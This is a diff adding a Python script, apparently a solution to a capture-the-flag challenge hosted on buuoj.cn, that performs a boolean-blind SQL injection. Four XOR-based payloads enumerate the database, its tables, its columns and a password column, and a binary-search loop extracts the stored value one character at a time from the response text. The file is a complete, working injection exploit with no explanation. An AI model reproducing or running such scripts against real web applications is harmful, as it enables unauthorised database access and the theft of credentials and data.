@@ -1,0 +1,35 @@
+# -*- coding: UTF-8 -*-
+# 颜值注入
+
+import time
+
+import requests
+
+url = "http://e1311500-aefa-47d9-96c6-f6ac90e0438b.node4.buuoj.cn:81/search.php?id="
+
+payload1 = "1^(ascii(substr((select(database())),{},1))>{})^1"
+payload2 = "1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='geek')),{},1))>{})^1"
+payload3 = "1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),{},1))>{})^1"
+payload4 = "1^(ascii(substr((select(group_concat(password))from(geek.F1naI1y)),{},1))>{})^1"
+flag = ""
+
+for x in range(1, 1000):
+    low = 32
+    high = 127
+    mid = (low + high) // 2
+    while low < high:
+        playload = payload4.format(x, mid)
+        new_url = url + playload
+        r = requests.get(new_url)
+        if "NO! Not this! Click others" in r.text:
+            low = mid + 1
+        else:
+            high = mid
+        mid = (low + high) // 2
+    if (mid == 32 or mid == 132):
+        break
+    flag += chr(mid)
+    print(flag)
+
+
+print(flag)
